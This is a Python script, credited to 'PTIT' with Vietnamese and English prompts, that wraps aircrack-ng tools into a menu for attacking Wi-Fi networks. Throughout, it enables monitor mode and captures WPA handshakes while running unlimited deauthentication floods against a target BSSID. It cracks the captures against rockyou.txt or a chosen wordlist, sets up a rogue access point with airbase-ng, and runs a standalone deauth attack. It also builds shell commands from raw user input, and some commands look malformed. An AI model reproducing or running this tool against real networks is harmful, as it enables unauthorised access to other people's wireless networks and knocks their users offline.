#!/usr/bin/env python
import os
import subprocess
from subprocess import check_call
import threading
print("\nInstalling Needed Tools")
print("\n")
cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
cmd  = os.system("sleep 3 && clear")
def run_airbase(ap, channel):
    order = ["airbase-ng", "-e", ap, "-c", channel, "wlan0mon"]
    subprocess.Popen(order, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def intro():
    cmd  = os.system("clear")
    print("""\033[1;32m
---------------------------------------------------------------------------------------
 _____ _______ _____ _______ 
 |  __ \__   __|_   _|__   __|
 | |__) | | |    | |    | |   
 |  ___/  | |    | |    | |   
 | |      | |   _| |_   | |   
 |_|      |_|  |_____|  |_|           
                                                        Coded By PTIT
---------------------------------------------------------------------------------------      
   
   

                                                                          
(1)Start monitor mode                              
(2)Scan Networks                            
(3)Getting Handshake(monitor mode needed)                     
(4)Crack Handshake with rockyou.txt (Handshake needed)
(5)Crack Handshake with wordlist    (Handshake needed)
(6)Create AP
(7)Deauth Attack

-----------------------------------------------------------------------
""")
    print("\nNhập lựa chọn")
    var = int(input(""))
    if var == 1 :
        print("\nChọn giao diện mạng")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        order = "airodump-ng {} -M".format("wlan0mon")
        print("\nNhấn CTRL C khi xong")
        cmd = os.system("sleep 3")
        geny  = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    elif var == 3:
        interface = "wlan0mon"
        print("\nPress CTRL+C when you find the target")
        airodump_process = subprocess.Popen(["airodump-ng", interface, "-M"])
        cmd = os.system("sleep 7")
        print("\nEnter the BSSID of the target")
        bssid = str(input(""))
        print("\nEnter the channel of the network")
        channel = int(input(""))
        print("\nEnter the path of the output file")
        path = str(input(""))
        print("\nEnter the number of packets")
        dist = int(input(""))
        airodump_process.kill()  # Dừng tiến trình airodump-ng trước khi chạy aireplay-ng
        airodump_order = ["airodump-ng", interface, "--bssid", bssid, "-c", str(channel), "-w", path]
        aireplay_order = ["aireplay-ng", "-0", "0", "-a", bssid, interface]
        subprocess.Popen(airodump_order)
        subprocess.Popen(aireplay_order)
        intro()
        
    
    elif var == 4:
        if  os.path.exists("/usr/share/wordlists/rockyou.txt")==True:
            print("\nNhập đường dẫn chứa gói tin handshake")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            sleep = os.system("sleep 5d")
            intro()
        elif os.path.exists("/usr/share/wordlists/rockyou.txt")==False:
            cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            print("\nNhập đường dẫn chứa gói tin handshake")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            sleep = os.system("sleep 5d")
            intro()
    elif var == 5 :
        print("\nNhập đường dẫn chứa gói tin handshake")
        path = str(input(""))
        print("\nNhập đường dẫn chứa wordlist")
        wordlist = str(input(""))
        order = ("aircrack-ng {} -w {}").format(path,wordlist)
        geny = os.system(order)
        sleep = os.system("sleep 5d")
        intro()

    elif var == 6:
        print("\nNhập tên AP bạn muốn tạo")
        ap = str(input(""))
        print("\nNhập kênh của AP")
        channel = str(input(""))
        run_airbase(ap, channel)
        intro()
    elif var == 7:
        print("\nNhập BSSID ")
        bssid = str(input())
        print("\nNhập kênh mạng")
        channel = str(input())
        order1 = ("sudo iwconfig wlan0mon channel {}").format(channel)
        subprocess.run(order1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        order = ("sudo aireplay-ng -30 0 -a {} wlan0mon").format(bssid)
        geny = os.system(order)
        exit()
        
